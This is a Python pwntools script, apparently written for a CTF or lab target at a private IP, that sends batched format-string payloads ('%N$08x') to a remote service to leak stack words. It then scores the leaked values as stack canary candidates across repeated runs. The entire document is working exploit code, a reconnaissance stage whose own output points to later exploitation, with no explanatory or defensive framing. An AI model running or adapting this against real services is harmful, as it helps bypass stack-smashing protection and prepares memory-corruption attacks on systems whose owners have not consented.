
#!/usr/bin/env python3
from pwn import *
import argparse
import re

parser = argparse.ArgumentParser()
parser.add_argument("--host", default="10.234.128.27")
parser.add_argument("--port", type=int, default=24002)
parser.add_argument("--start", type=int, default=1)
parser.add_argument("--end", type=int, default=80)
parser.add_argument("--batch", type=int, default=12)
parser.add_argument("--repeat", type=int, default=3)
parser.add_argument("--debug", action="store_true")
args = parser.parse_args()

context.clear(arch="i386", os="linux")
context.log_level = "debug" if args.debug else "error"

def leak_batch(indices):
    io = remote(args.host, args.port, timeout=5)

    try:
        fmt = b"BEGIN|" + b"|".join(
            f"%{i}$08x".encode() for i in indices
        ) + b"|END"

        io.sendlineafter(b"You: ", fmt)

        data = io.recvuntil(b"|END", timeout=5)

        match = re.search(
            rb"BEGIN\|(.*?)\|END",
            data,
            re.DOTALL
        )

        if not match:
            return {}

        values = match.group(1).split(b"|")

        result = {}
        for index, raw in zip(indices, values):
            try:
                result[index] = int(raw, 16)
            except ValueError:
                pass

        return result

    finally:
        io.close()


def scan():
    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Scanning: {args.start} - {args.end}")
    print(f"[*] Repetitions: {args.repeat}")
    print()

    all_results = []

    for run in range(args.repeat):
        print(f"========== RUN {run + 1} ==========")

        results = {}

        for start in range(
            args.start,
            args.end + 1,
            args.batch
        ):
            indices = list(range(
                start,
                min(start + args.batch, args.end + 1)
            ))

            try:
                leaked = leak_batch(indices)
                results.update(leaked)
            except Exception as e:
                print(f"[!] Batch failed: {e}")

        all_results.append(results)

        for index in sorted(results):
            value = results[index]

            marker = ""
            if value != 0 and (value & 0xff) == 0:
                marker = " <-- CANARY CANDIDATE"

            print(
                f"%{index:02d}$p = "
                f"0x{value:08x}{marker}"
            )

        print()

    print("========== ANALYSIS ==========")

    candidates = []

    for index in range(args.start, args.end + 1):
        values = [
            result[index]
            for result in all_results
            if index in result
        ]

        if len(values) != args.repeat:
            continue

        if not all(
            v != 0 and (v & 0xff) == 0
            for v in values
        ):
            continue

        unique = len(set(values))

        print(f"[+] Candidate index: {index}")
        print(
            "    Values: " +
            ", ".join(hex(v) for v in values)
        )
        print(f"    Unique values: {unique}")

        if unique > 1:
            print("    Canary-like: changes across runs")
        else:
            print("    Stable across runs")

        candidates.append(index)

    print()
    if candidates:
        print("[+] Possible indices:", candidates)
        print("[*] Verify candidates before exploitation.")
    else:
        print("[-] No candidates found.")
        print("[*] Try increasing --end.")

if __name__ == "__main__":
    scan()

